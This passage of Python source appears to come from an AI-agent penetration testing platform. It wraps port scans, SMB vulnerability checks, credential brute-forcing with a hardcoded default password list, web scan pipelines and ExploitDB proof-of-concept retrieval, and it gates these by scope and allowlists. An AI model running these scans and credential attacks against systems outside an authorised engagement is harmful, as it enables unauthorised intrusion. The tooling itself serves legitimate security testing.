        # (profile 'all') or deliberately excluded.
        full_ports = ""

    # full_ports should only be non-empty when explicitly set to DEEP_SCAN_PORTS
    # or to a resolved port profile.  LLMs frequently hallucinate values here,
    # so reject anything that isn't recognized.
    if full_ports and full_ports != DEFAULT_DEEP_SCAN_PORTS and not _is_known_port_scope(full_ports):
        logger.warning(f"Ignoring unexpected full_ports='{full_ports}', expected '' or '{DEFAULT_DEEP_SCAN_PORTS}'")
        full_ports = ""
    if full_ports is None:
        full_ports = ""

    # Full-range follow-up is now automatic rather than a separate call the model
    # had to remember to make.  It ran as Phase 2 in parallel with the Phase 1
    # nmap enrichment, so scheduling it here costs no extra wall-clock — whereas
    # leaving it to a later start_deep_port_scan meant that whenever the model
    # skipped that step (or the session ended first) the engagement silently
    # shipped with only top-1000 coverage.
    #
    # Not applied when the operator picked a session scope: that selection
    # already defines the sweep, and widening it back to 1-65535 would ignore a
    # deliberately narrow (e.g. redteam-targeted) choice.  The session-scope
    # branch above clears full_ports for exactly this reason.
    # Also skipped when the quick pass IS the full range — start_deep_port_scan
    # delegates here with quick_ports=1-65535, and without this it would queue a
    # second identical sweep behind the first.
    _quick_is_full_range = quick_ports.strip() in (DEFAULT_DEEP_SCAN_PORTS, "1-65535", "0-65535")
    if not full_ports and not session_scope and not _quick_is_full_range:
        full_ports = DEFAULT_DEEP_SCAN_PORTS
        logger.info(
            "Scheduling the full-range masscan follow-up (%s) alongside the "
            "top-1000 quick pass", full_ports,
        )

    result = get_scan_tools().start_full_scan(
        target_list,
        quick_ports=quick_ports,
        full_ports=full_ports,
        rate=rate,
        run_smb_vuln_scan=bool(run_smb_vuln_scan),
        run_credential_check=bool(run_credential_check)
    )

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("full_scan", job_id, {
            "targets": target_list,
            "quick_ports": quick_ports,
            "full_ports": full_ports
        })
        result["next_step"] = (
            f"Scan started. Call: "
            f"wait_for_job_completion(job_id='{job_id}', job_type='nmap'). "
            f"It will wait until the scan finishes (no timeout). Do NOT set timeout_seconds. "
            f"When it completes, READ the 'recommended_follow_up_scans' in the result and CALL those tools. "
            f"Run web scans FIRST (one at a time), then start_deep_port_scan LAST."
        )

    return json.dumps(result, indent=2)


def start_deep_port_scan(
    targets: str = None,
    target: str = None,
    rate: int = 1000
) -> str:
    """
    Start a deep port scan covering the full range, 1-65535.

    USUALLY UNNECESSARY: start_full_scan now schedules this sweep automatically as
    its phase 2. Call this only to re-sweep a target whose full scan predates that
    change, or when you deliberately skipped the full scan.

    Uses the same backend as start_full_scan, with the full range as the discovery
    pass and service detection on whatever it finds.

    Args:
        targets: Comma-separated string of IPs or CIDRs (e.g. "192.168.1.150")
        target: Alias for targets
        rate: Masscan rate in packets per second

    Returns JSON string with job information.
    """
    targets = targets or target
    if not targets:
        return json.dumps({"error": "No target specified. Use 'targets' parameter with a string like '192.168.1.150'."})

    # When the operator pinned a port scope for this session, the quick scan
    # already covered exactly the ports they asked for.  A full-range sweep here
    # would either duplicate that work (profile 'all') or scan ports they
    # deliberately excluded — so decline instead, and say why.
    session_scope = scan_tracker.get_port_scope()
    if session_scope:
        profile_id = scan_tracker.get_port_profile()
        logger.info(f"Skipping deep port scan — session port scope '{profile_id}' already covers the intended range")
        return json.dumps({
            "skipped": True,
            "reason": (
                f"This session runs with the '{profile_id}' port scope "
                f"({count_profile_ports(session_scope)} ports), which start_full_scan "
                f"already covered. A deep 1-65535 sweep would go outside the "
                f"operator's selected scope. Do NOT retry this tool — move on to "
                f"analysing results or running service-specific follow-up scans."
            ),
            "port_profile": profile_id,
        }, indent=2)

    # Delegate to start_full_scan with high-port range as the quick scan
    result_str = start_full_scan(
        targets=targets,
        quick_ports=DEFAULT_DEEP_SCAN_PORTS,
        full_ports="",
        rate=rate
    )
    result = json.loads(result_str)

    # Re-track as deep_port_scan type
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("deep_port_scan", job_id, {
            "targets": [t.strip() for t in str(targets).split(',')],
            "quick_ports": DEFAULT_DEEP_SCAN_PORTS,
            "full_ports": ""
        })

    return json.dumps(result, indent=2)


def start_smb_vuln_scan(
    targets: str = None,
    target: str = None
) -> str:
    """
    Start an SMB-specific vulnerability scan.

    Detects critical Samba/SMB vulnerabilities:
    - CVE-2007-2447 (Samba usermap_script) - CRITICAL RCE on Samba 3.0.20-3.0.25rc3
    - CVE-2017-7494 (SambaCry)
    - MS17-010 (EternalBlue)
    - MS08-067 (NetAPI)

    Use this ONLY when ports 139 or 445 are open.

    Args:
        targets: Plain IP address string (e.g. "192.168.1.150")
        target: Alias for targets

    Returns JSON string with job information including detected CVEs.
    """
    targets = targets or target
    if not targets:
        return json.dumps({"error": "No target specified. Use 'targets' parameter."})
    if isinstance(targets, list):
        target_list = [str(t).strip() for t in targets]
    else:
        target_list = [t.strip() for t in str(targets).split(',')]

    result = get_scan_tools().start_smb_vuln_scan(target_list)

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("smb_vuln", job_id, {"targets": target_list})
        result["next_step"] = (
            f"SMB scan started with job_id='{job_id}'. "
            f"Call wait_for_job_completion(job_id='{job_id}', job_type='nmap') to wait, "
            f"or get_session_scan_status() to check all scans (no job_id needed)."
        )

    return json.dumps(result, indent=2)


def start_credential_check(
    targets: str = None,
    target: str = None,
    ports: str = None,
    services: str = None,
    method: str = "hydra"
) -> str:
    """
    Start credential testing for default/weak passwords.

    Tests common default credentials for services:
    - SSH: msfadmin:msfadmin, root:root, admin:admin
    - FTP: anonymous, ftp:ftp
    - MySQL: root with empty password
    - PostgreSQL: postgres:postgres
    - VNC: common passwords (password, 1234)
    - Telnet: msfadmin:msfadmin
    - Tomcat: tomcat:tomcat, admin:admin

    Also checks port 1524 for bindshell (instant root access).

    IMPORTANT: 'targets' must be plain IP addresses (e.g. "192.168.1.150"), NOT URLs.
    Do NOT pass ssh://..., ftp://..., or any URL scheme — just the IP.
    Check job status with get_nmap_job_status(job_id), NOT get_brutus_job_status.

    Args:
        targets: Comma-separated list of plain IP addresses (e.g. "192.168.1.150")
        target: Alias for targets (plain IP address)
        ports: Comma-separated ports to check (auto-detects service)
        services: Comma-separated services (ssh, ftp, mysql, postgres, vnc, telnet, tomcat)
        method: Testing method ('hydra' or 'nmap')

    Returns JSON string with job info. Use get_nmap_job_status to check progress.
    """
    import re
    targets = targets or target
    if not targets:
        return json.dumps({"error": "No target specified. Use 'targets' parameter with plain IP addresses."})

    # Sanitize targets: strip URL schemes, BBCode tags, port suffixes — extract plain IPs
    raw_list = [t.strip() for t in targets.split(',')]
    target_list = []
    for t in raw_list:
        # Strip BBCode [url=...]...[/url] wrappers
        t = re.sub(r'\[/?url[^\]]*\]', '', t)
        # Strip URL schemes like ssh://, ftp://, http://
        t = re.sub(r'^[a-zA-Z]+://', '', t)
        # Strip trailing port (:22, :3306, etc.)
        t = re.sub(r':\d+$', '', t)
        t = t.strip()
        if t:
            target_list.append(t)

    if not target_list:
        return json.dumps({"error": "No valid IP addresses found after parsing targets. Use plain IPs like '192.168.1.150'."})

    port_list = None
    if ports:
        port_list = [int(p.strip()) for p in ports.split(',')]

    service_list = None
    if services:
        service_list = [s.strip() for s in services.split(',')]

    result = get_scan_tools().start_credential_check(
        target_list,
        ports=port_list,
        services=service_list,
        method=method
    )

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("credential_check", job_id, {
            "targets": target_list,
            "ports": port_list,
            "services": service_list
        })
        result["next_step"] = (
            f"Credential check started with job_id='{job_id}'. "
            f"Call wait_for_job_completion(job_id='{job_id}', job_type='nmap') to wait, "
            f"or get_session_scan_status() to check all scans (no job_id needed)."
        )

    return json.dumps(result, indent=2)


def start_web_scan(do_gobuster: bool = True, do_zap: bool = True, limit: int = 25) -> str:
    """
    Start a web scan with Gobuster and/or ZAP.

    If the operator selected a web scan depth for this session, its stage list
    decides which tools run and how many targets are taken — their choice
    outranks whatever the model passed, which is the point of the selector.

    Args:
        do_gobuster: Run Gobuster directory enumeration
        do_zap: Run ZAP proxy scanning
        limit: Maximum number of targets to scan

    Returns JSON string with job information.
    """
    web_scope = scan_tracker.get_web_scope()
    if web_scope:
        stages = set(web_scope["stages"])
        do_gobuster, do_zap = "gobuster" in stages, "zap" in stages
        limit = web_scope["max_paths"]
        logger.info(
            f"Web scope '{scan_tracker.get_web_profile()}' applied: "
            f"gobuster={do_gobuster}, zap={do_zap}, limit={limit}"
        )

    result = get_scan_tools().start_web_scan(do_gobuster, do_zap, limit)

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("web_scan", job_id, {"do_gobuster": do_gobuster, "do_zap": do_zap, "limit": limit})
        result["next_step"] = (
            f"Web scan started with job_id='{job_id}'. "
            f"Call wait_for_job_completion(job_id='{job_id}', job_type='web') to wait, "
            f"or get_session_scan_status() to check all scans (no job_id needed)."
        )

    return json.dumps(result, indent=2)


def start_pipeline_scan(
    target_url: str,
    wordlist: str = None,
    max_paths_to_visit: int = 50,
    skip_gobuster: bool = False,
    skip_playwright: bool = False,
    skip_zap: bool = False,
    skip_nuclei: bool = False,
    skip_katana: bool = False
) -> str:
    """
    Start a sequential web scan pipeline: Gobuster → Nikto → Playwright → Katana → ZAP → Nuclei

    This runs a comprehensive web scan where each stage feeds discovered
    data to subsequent stages:
    1. Gobuster - Discovers paths/directories
    2. Nikto - Web server security scanning (fast, no URL dependency)
    3. Playwright - Visits discovered paths with browser, extracts forms/cookies
    4. Katana - JS-aware crawling for endpoints, forms, JS URLs
    5. ZAP - Runs vulnerability scan with all discovered URLs pre-seeded
    6. Nuclei - Checks for CVEs and misconfigurations on all paths

    Args:
        target_url: Target URL (e.g., "http://192.168.1.150")
        wordlist: Gobuster wordlist (small, medium, big, common, etc.)
        max_paths_to_visit: Max paths for Playwright to visit (default: 50)
        skip_gobuster: Skip Gobuster stage
        skip_playwright: Skip Playwright stage
        skip_zap: Skip ZAP stage
        skip_nuclei: Skip Nuclei stage
        skip_katana: Skip Katana stage

    Returns JSON string with job information including job_id and stages.
    """
    # A session web scope decides which stages run and how deep. Note the
    # inversion: the profile lists stages to RUN, these params name stages to
    # SKIP, so each flag is the negation of stage membership.
    web_scope = scan_tracker.get_web_scope()
    if web_scope:
        stages = set(web_scope["stages"])
        skip_gobuster = "gobuster" not in stages
        skip_playwright = "playwright" not in stages
        skip_zap = "zap" not in stages
        skip_nuclei = "nuclei" not in stages
        skip_katana = "katana" not in stages
        wordlist = wordlist or web_scope["wordlist"] or None
        max_paths_to_visit = web_scope["max_paths"]
        logger.info(
            f"Web scope '{scan_tracker.get_web_profile()}' applied to pipeline: "
            f"stages={','.join(sorted(stages))}, wordlist={wordlist}, "
            f"max_paths={max_paths_to_visit}"
        )

    result = get_scan_tools().start_pipeline_scan(
        target_url, wordlist, max_paths_to_visit,
        skip_gobuster, skip_playwright, skip_zap, skip_nuclei, skip_katana
    )

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("web_scan", job_id, {
            "target_url": target_url,
            "scan_type": "pipeline",
            "stages": ["gobuster", "nikto", "playwright", "katana", "zap", "nuclei"]
        })
        result["next_step"] = (
            f"Pipeline scan started with job_id='{job_id}'. "
            f"Call wait_for_job_completion(job_id='{job_id}', job_type='web') to wait, "
            f"or get_session_scan_status() to check all scans (no job_id needed)."
        )

    return json.dumps(result, indent=2)


def start_nuclei_scan(limit: int = 25, severity: str = "medium,high,critical", all_ports: bool = True) -> str:
    """
    Start a Nuclei vulnerability scan on ALL open ports (not just web ports).

    Args:
        limit: Maximum number of targets
        severity: Comma-separated severity levels
        all_ports: Scan ALL open ports (True) or just web ports (False)

    Returns JSON string with job information.
    """
    web_scope = scan_tracker.get_web_scope()
    if web_scope and web_scope.get("nuclei_severity"):
        severity = web_scope["nuclei_severity"]
        limit = web_scope["max_paths"]
        logger.info(
            f"Web scope '{scan_tracker.get_web_profile()}' applied to nuclei: "
            f"severity={severity}, limit={limit}"
        )

    result = get_scan_tools().start_nuclei_scan(limit, severity, all_ports)

    # Track the scan job
    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("nuclei", job_id, {"limit": limit, "severity": severity, "all_ports": all_ports})

    return json.dumps(result, indent=2)


def start_playwright_scan(
    url: str,
    use_zap: bool = True,
    capture_screenshots: bool = True
) -> str:
    """
    Start a Playwright browser security scan.

    Args:
        url: Target URL
        use_zap: Route traffic through ZAP proxy
        capture_screenshots: Capture page screenshots

    Returns JSON string with scan information.
    """
    result = get_scan_tools().start_playwright_scan(url, use_zap, capture_screenshots)

    # Track the scan job (playwright uses scan_id instead of job_id)
    job_id = result.get("scan_id") or result.get("job_id")
    if job_id:
        scan_tracker.track_scan("playwright", job_id, {"url": url, "use_zap": use_zap})

    return json.dumps(result, indent=2)


# ===============================
# PD Runner Wrapper Functions
# ===============================

def start_subfinder(domains: str, sources: str = None) -> str:
    """
    Start passive subdomain enumeration with subfinder.

    Args:
        domains: Comma-separated list of domains (e.g., "example.com,test.com")
        sources: Optional comma-separated list of data sources

    Returns JSON string with job information.
    """
    if not domains:
        return json.dumps({"error": "No domains specified."})
    domain_list = [d.strip() for d in domains.split(',')]
    result = get_scan_tools().start_subfinder(domain_list, sources)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("subfinder", job_id, {"domains": domain_list})

    return json.dumps(result, indent=2)


def start_dnsx(domains: str, record_types: str = "A,AAAA,CNAME,MX,NS") -> str:
    """
    Start DNS resolution and enumeration with dnsx.

    Args:
        domains: Comma-separated list of domains (e.g., "example.com,test.com")
        record_types: Comma-separated record types (e.g., "A,AAAA,CNAME,MX,NS")

    Returns JSON string with job information.
    """
    if not domains:
        return json.dumps({"error": "No domains specified."})
    domain_list = [d.strip() for d in domains.split(',')]
    result = get_scan_tools().start_dnsx(domain_list, record_types)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("dnsx", job_id, {"domains": domain_list, "record_types": record_types})

    return json.dumps(result, indent=2)


def start_asnmap(targets: str) -> str:
    """
    Start ASN to CIDR mapping with asnmap.

    Args:
        targets: Comma-separated list of IPs, domains, or ASNs (e.g., "8.8.8.8,AS15169")

    Returns JSON string with job information.
    """
    if not targets:
        return json.dumps({"error": "No targets specified."})
    target_list = [t.strip() for t in targets.split(',')]
    result = get_scan_tools().start_asnmap(target_list)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("asnmap", job_id, {"targets": target_list})

    return json.dumps(result, indent=2)


def start_uncover(query: str, engine: str = "shodan", limit: int = 100) -> str:
    """
    Start a Shodan/Censys/Fofa search query with uncover.

    Args:
        query: Search query (e.g., "org:example.com port:22")
        engine: Search engine to use (shodan, censys, fofa)
        limit: Maximum number of results

    Returns JSON string with job information.
    """
    if not query:
        return json.dumps({"error": "No query specified."})
    result = get_scan_tools().start_uncover(query, engine, limit)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("uncover", job_id, {"query": query, "engine": engine})

    return json.dumps(result, indent=2)


def start_cloudlist(provider: str) -> str:
    """
    Start cloud provider IP enumeration with cloudlist.

    Args:
        provider: Cloud provider name (aws, gcp, azure, do, etc.)

    Returns JSON string with job information.
    """
    if not provider:
        return json.dumps({"error": "No provider specified."})
    result = get_scan_tools().start_cloudlist(provider)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("cloudlist", job_id, {"provider": provider})

    return json.dumps(result, indent=2)


def start_subdomain_takeover(subdomains: str, timeout: int = 30) -> str:
    """
    Start subdomain takeover detection scan.

    Args:
        subdomains: Comma-separated list of subdomains (e.g., "api.example.com,cdn.example.com")
        timeout: HTTP request timeout in seconds (default: 30)

    Returns JSON string with job information.
    """
    if not subdomains:
        return json.dumps({"error": "No subdomains specified."})
    subdomain_list = [s.strip() for s in subdomains.split(',')]
    result = get_scan_tools().start_subdomain_takeover(subdomain_list, timeout)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("subdomain_takeover", job_id, {"subdomains": subdomain_list, "timeout": timeout})

    return json.dumps(result, indent=2)


def get_osint_job_status(job_id: str) -> str:
    """
    Check the status of an OSINT Runner job (subfinder, dnsx, asnmap, uncover, cloudlist).

    Args:
        job_id: The job ID returned when starting the scan

    Returns JSON string with job status and progress.
    """
    result = get_scan_tools().get_osint_job_status(job_id)
    return json.dumps(result, indent=2)


def get_brutus_job_status(job_id: str) -> str:
    """
    Check the status of a Brutus Runner credential testing job.

    Args:
        job_id: The job ID returned when starting the brutus scan

    Returns JSON string with job status and progress.
    """
    result = get_scan_tools().get_brutus_job_status(job_id)
    return json.dumps(result, indent=2)


def start_httpx_probe(targets: str = "from_db", ports: str = None, tech_detect: bool = True) -> str:
    """
    Start HTTP probing and technology detection with httpx.

    Discovers live web servers, their technologies, titles, and status codes.
    Use targets="from_db" to probe all discovered open web ports automatically.

    Args:
        targets: Comma-separated URLs/IPs or "from_db" to use discovered web ports
        ports: Optional ports to probe (e.g., "80,443,8080")
        tech_detect: Enable technology detection (default: true)

    Returns JSON string with job information.
    """
    if targets == "from_db":
        target_val = "from_db"
    elif targets:
        target_val = [t.strip() for t in targets.split(',')]
    else:
        return json.dumps({"error": "No targets specified. Use 'from_db' or provide target list."})

    result = get_scan_tools().start_httpx_probe(target_val, ports, tech_detect)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("httpx", job_id, {"targets": targets, "ports": ports})

    return json.dumps(result, indent=2)


def start_naabu(targets: str = None, target: str = None, ports: str = DEFAULT_QUICK_PORTS, rate: int = 1000) -> str:
    """
    Start fast port scanning with naabu.

    Args:
        targets: Comma-separated list of IPs or CIDRs (e.g., "192.168.1.0/24,10.0.0.1")
        target: Alias for targets
        ports: Port range. Omit it — the default is nmap's top-1000, the 1000 most
               commonly OPEN ports. Do NOT pass "1-1000": that is the first 1000 port
               NUMBERS, which misses mysql 3306, postgresql 5432, vnc 5900 and tomcat
               8180. Pass a value only for a genuinely specific scope (e.g. "80,443").
        rate: Scan rate in packets per second

    Returns JSON string with job information.
    """
    targets = targets or target
    if not targets:
        return json.dumps({"error": "No target specified."})
    target_list = [t.strip() for t in targets.split(',')]
    result = get_scan_tools().start_naabu(target_list, ports, rate)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("naabu", job_id, {"targets": target_list, "ports": ports})

    return json.dumps(result, indent=2)


def start_katana(targets: str = "from_db", depth: int = 3, js_crawl: bool = True) -> str:
    """
    Start web crawling with katana.

    Crawls discovered web services to find endpoints, forms, and JavaScript files.
    Use targets="from_db" to crawl all discovered web services.

    Args:
        targets: Comma-separated URLs or "from_db"
        depth: Crawl depth (default: 3)
        js_crawl: Enable JavaScript crawling (default: true)

    Returns JSON string with job information.
    """
    if targets == "from_db":
        target_val = "from_db"
    elif targets:
        target_val = [t.strip() for t in targets.split(',')]
    else:
        return json.dumps({"error": "No targets specified."})

    result = get_scan_tools().start_katana(target_val, depth, js_crawl)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("katana", job_id, {"targets": targets, "depth": depth})

    return json.dumps(result, indent=2)


def start_brutus(targets: str, protocols: str, usernames: str = None, passwords: str = None) -> str:
    """
    Start multi-protocol credential testing with brutus.

    Tests for default/weak credentials on discovered services.

    Args:
        targets: Comma-separated host:port pairs (e.g., "192.168.1.1:22,192.168.1.1:3306")
        protocols: Comma-separated protocols (e.g., "ssh,ftp,mysql,smb")
        usernames: Comma-separated usernames to test (e.g., "root,admin,user")
        passwords: Comma-separated passwords to test (e.g., "password,admin,root")

    Returns JSON string with job information.
    """
    if not targets or not protocols:
        return json.dumps({"error": "Both targets and protocols are required."})
    target_list = [t.strip() for t in targets.split(',')]
    protocol_list = [p.strip() for p in protocols.split(',')]
    username_list = [u.strip() for u in usernames.split(',')] if usernames else None
    password_list = [p.strip() for p in passwords.split(',')] if passwords else None

    result = get_scan_tools().start_brutus(target_list, protocol_list, username_list, password_list)

    job_id = result.get("job_id")
    if job_id:
        scan_tracker.track_scan("brutus", job_id, {"targets": target_list, "protocols": protocol_list})

    return json.dumps(result, indent=2)


def get_pd_job_status(job_id: str) -> str:
    """
    Check the status of a PD Runner job (httpx, naabu, katana, tlsx, brutus).

    Args:
        job_id: The job ID returned when starting the scan

    Returns JSON string with job status and progress.
    """
    result = get_scan_tools().get_pd_job_status(job_id)
    return json.dumps(result, indent=2)


def query_exploitdb(query: str, top_k: int = 5) -> str:
    """
    Query the ExploitDB database via RAG.

    Args:
        query: Search query (e.g., "apache 2.4 exploit")
        top_k: Number of results to return

    Returns JSON string with exploit information.
    """
    result = get_scan_tools().query_exploitdb(query, top_k)
    return json.dumps(result, indent=2)


def get_scan_recommendations(context: str) -> str:
    """
    Get AI-powered scan recommendations.

    Args:
        context: Description of target or current situation

    Returns JSON string with recommendations.
    """
    result = get_scan_tools().get_scan_recommendations(context)
    return json.dumps(result, indent=2)


def run_custom_test(tool: str, command: str, target: str, port: int = None,
                    service: str = None, timeout: int = 300) -> str:
    """Run ONE allowlisted, scope-gated security-test command and capture evidence.

    DELIBERATELY NOT registered as an agent tool. It takes an arbitrary command
    string, and handing that to a react-agent would let the model launder any
    command through the gate — strictly more dangerous than the fixed start_*
    dispatchers. It is called ONLY deterministically from the surface-test safe
    lane. Keeping it off every LLM toolset preserves the property that the
    toolset, not the prompt, enforces what can be dispatched.

    It only POSTs to kali-listener /tools/execute, which independently enforces
    the scope gate (fail-closed; scans the command for out-of-scope IP literals),
    the tool allowlist (Metasploit excluded), the dangerous-char filter, and
    MAX_CONCURRENT_SCANS. No local subprocess, no target pre-filtering — the slot
    and the scope decision are held at that endpoint.

    Returns JSON: {ok, exec_id, status_code} on dispatch, or an error shape. The
    caller polls /tools/executions/{exec_id} for the terminal result + evidence.
    """
    import httpx as _hx
    base = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
    payload = {"tool": tool, "command": command, "target": target,
               "port": port, "service": service, "timeout": timeout}
    try:
        with _hx.Client(verify=False, timeout=timeout + 30) as c:
            r = c.post(f"{base}/tools/execute", json=payload)
        body = {}
        if r.headers.get("content-type", "").startswith("application/json"):
            body = r.json()
        return json.dumps({
            "ok": r.status_code < 400,
            "status_code": r.status_code,
            "exec_id": body.get("exec_id") or body.get("execution_id"),
            "detail": None if r.status_code < 400 else r.text[:400],
            **({k: v for k, v in body.items() if k not in ("exec_id", "execution_id")}),
        })
    except Exception as e:  # noqa: BLE001
        return json.dumps({"ok": False, "status_code": 0,
                           "error": f"{type(e).__name__}: {e}"})


def get_execution_status(exec_id: str) -> str:
    """Read one kali-listener tool execution (status, exit_code, output,
    parsed_results) — the terminal evidence for a safe security-test run.
    Read-only GET; returns JSON string, or an error shape."""
    import httpx as _hx
    base = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
    try:
        with _hx.Client(verify=False, timeout=30) as c:
            r = c.get(f"{base}/tools/executions/{exec_id}")
        if r.status_code != 200:
            return json.dumps({"ok": False, "status_code": r.status_code})
        return json.dumps(r.json())
    except Exception as e:  # noqa: BLE001
        return json.dumps({"ok": False, "error": f"{type(e).__name__}: {e}"})


def analyze_attack_surface(target_host: str = None, limit: int = 8) -> str:
    """Enumerate one host's full attack surface as structured JSON.

    Composes the MITRE-mapped attack vectors, the host's open ports/services,
    its web findings, and per-service tool/methodology recommendations (including
    ingested attack-path knowledge) into one summary an agent can turn into
    concrete tests.

    Args:
        target_host: The host/IP to analyze. When omitted, the highest-risk host
            from the attack-vector map is used.
        limit: Max (service, port) pairs to expand recommendations for.

    Returns a JSON string: {target, vectors[], services[{service, port,
    recommendations}], web_findings_count}.
    """
    st = get_scan_tools()
    host = (target_host or "").strip() or None

    def _j(fn, **kw):
        try:
            return json.loads(fn(**kw))
        except Exception:
            return {}

    # get_attack_vectors is a module-level tool; call it for the ranked list.
    try:
        av = json.loads(get_attack_vectors(limit=limit, min_risk=0.0))
        vlist = av.get("vectors") or []
    except Exception:
        vlist = []

    if not host and vlist:
        raw = str(vlist[0].get("target") or "")
        # normalize a target that may be a host, url, or "service on host"
        import re as _re
        m = _re.search(r"[0-9]{1,3}(?:\.[0-9]{1,3}){3}", raw)
        host = m.group(0) if m else (raw.split("//")[-1].split("/")[0].split(":")[0] or None)

    ports = _j(query_open_ports, target=host, limit=100) if host else {}
    items = ports.get("items") or []
    web = _j(get_web_findings, target=host, limit=100) if host else {}
    web_items = web.get("items") or web.get("findings") or []

    seen, services = set(), []
    for row in items:
        svc = (row.get("service") or "").strip().lower()
        prt = row.get("port")
        if not svc or (svc, prt) in seen:
            continue
        seen.add((svc, prt))
        if len(services) >= limit:
            break
        rec = _j(get_tool_recommendations, service=svc, port=prt)
        services.append({"service": svc, "port": prt, "ip": row.get("ip"),
                         "recommendations": rec})

    return json.dumps({
        "target": host,
        "vectors": vlist[:limit],
        "services": services,
        "web_findings_count": len(web_items),
    }, indent=2)


def get_wstg_guidance(issue_type: str = None, cwe: str = None, name: str = None,
                      nuclei_tags: str = None, target: str = None,
                      url: str = None) -> str:
    """Look up the OWASP WSTG-guided test for a SPECIFIC web finding.

    Given a finding's type / CWE / name / nuclei tags, returns the matched WSTG
    test spec (tier, category, tool, command, structured assertion) plus the
    WSTG "how to test" methodology prose. READ-ONLY — it dispatches nothing;
    it tells you HOW to prove the finding. Use it to turn a web finding into a
    concrete, provable security test (then create/queue that test via the normal
    gated path).

    Args:
        issue_type: the finding's type/category text (e.g. "SQL Injection").
        cwe: comma-separated CWE ids (e.g. "CWE-89").
        name: the finding's name/title.
        nuclei_tags: comma-separated nuclei tags (e.g. "xss,sqli").
        target: host or host:port, fills the command's {target}.
        url: the finding's URL, fills the command's {url} (falls back to target).

    Returns JSON: {matched, entry:{wstg_id, tier, category, tool, command,
    command_rendered, assertion, wstg_note}, guidance}.
    """
    st = get_scan_tools()
    params = {k: v for k, v in {
        "issue_type": issue_type, "cwe": cwe, "name": name,
        "nuclei_tags": nuclei_tags, "target": target, "url": url,
    }.items() if v}
    try:
        r = st.client.get(f"{st.rag_api_url}/rag/wstg", params=params,
                          headers=st.headers)
        return json.dumps(r.json(), indent=2)
    except Exception as e:
        return json.dumps({"matched": False, "error": str(e)})


def get_exploitdb_guidance(cve: str = None, query: str = None,
                           edb_id: str = None, limit: int = 8) -> str:
    """Read ExploitDB writeups relevant to a finding, to build a test from them.

    Searches the local ExploitDB index by CVE (preferred), free text, or a
    specific EDB id, and returns the matching entries plus the top match's
    writeup/PoC text. READ-ONLY — it reads the local exploit database; it runs
    nothing. Use it as guidance for synthesizing a security test (most
    ExploitDB-derived tests are impactful and stay approval-gated).

    Args:
        cve: a CVE id (e.g. "CVE-2021-41773") — the most precise key.
        query: free-text (product/keyword) when there is no CVE.
        edb_id: fetch one specific ExploitDB entry by id.
        limit: max entries to list.

    Returns JSON: {matched, count, results[{edb_id, description, type, platform,
    cve, file}], top:{edb_id, poc_excerpt}, guidance}.
    """
    st = get_scan_tools()
    base = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")
    try:
        if edb_id:
            r = st.client.get(f"{base}/exploitdb/{edb_id}", params={"with_poc": True},
                              headers=st.headers)
            row = r.json()
            results = [row]
            poc = row.get("poc") or ""
        else:
            r = st.client.get(f"{base}/exploitdb/search",
                              params={"cve": cve, "q": query, "limit": limit,
                                      "with_poc": True},
                              headers=st.headers)
            data = r.json()
            results = data.get("results") or []
            poc = (results[0].get("poc") if results else "") or ""
        if not results:
            return json.dumps({"matched": False, "count": 0, "results": [],
                               "guidance": ""})
        top = results[0]
        guidance = (
            f"ExploitDB EDB-{top.get('edb_id')} ({top.get('type')}/{top.get('platform')}): "
            f"{top.get('description')}\nCVE: {', '.join(top.get('cve') or []) or 'n/a'}\n\n"
            f"{poc[:6000]}")
        slim = [{k: e.get(k) for k in ("edb_id", "description", "type",
                                       "platform", "cve", "file")} for e in results]
        return json.dumps({"matched": True, "count": len(results), "results": slim,
                           "top": {"edb_id": top.get("edb_id"),
                                   "poc_excerpt": poc[:2000]},
                           "guidance": guidance}, indent=2)
    except Exception as e:  # noqa: BLE001
        return json.dumps({"matched": False, "error": str(e)})


def get_tool_recommendations(service: str = None, port: int = None) -> str:
    """
    Get the CONCRETE tests to run against a discovered service, as structured
    data rather than prose.

    This is the tool to call when you have a service/port and need to decide what
    to actually run. Unlike get_scan_recommendations, which answers a free-text
    question with a paragraph, this returns machine-readable fields:

      - tools[]        each with name, purpose and a ready `command` template
                       containing a {target} placeholder
      - metasploit[]   module paths with their purpose
      - nuclei_tags[]  tags to pass to a nuclei scan
      - common_vulns[] what typically goes wrong with this service
      - rag_context    ingested methodology for this service (playbooks and any
                       operator-supplied training documents)

    Service aliases are resolved, so `https`, `http-proxy` and `ssl/http` all
    return the web guidance, and `microsoft-ds` returns the SMB guidance.

    Args:
        service: Service name from the scan (e.g. 'https', 'smb', 'mysql')
        port: Port number. Supply either or both; the port infers the service
              when the name is unknown.

    Returns JSON string. Use the `command` templates to decide which start_*
    tool to dispatch and with what parameters.
    """
    result = get_scan_tools().get_tool_recommendations(service=service, port=port)
    return json.dumps(result, indent=2)


def get_attack_vectors(limit: int = 15, min_risk: float = 0.0) -> str:
    """
    Get the prioritized attack vector map: findings mapped to MITRE ATT&CK
    techniques + a unified risk score, ranked highest-risk first. Use this to
    decide the next-best action — which finding/technique to act on.

    Args:
        limit: max vectors to return (default 15)
        min_risk: only return vectors at/above this risk score (0..100)

    Returns JSON string: {count, vectors:[...]}.
    """
    t = get_scan_tools()
    api_key = os.environ.get("API_KEY", "changeme")
    try:
        r = httpx.get(
            f"{t.rag_api_url}/attack-vectors",
            params={"limit": limit, "min_risk": min_risk},
            headers={"x-api-key": api_key},
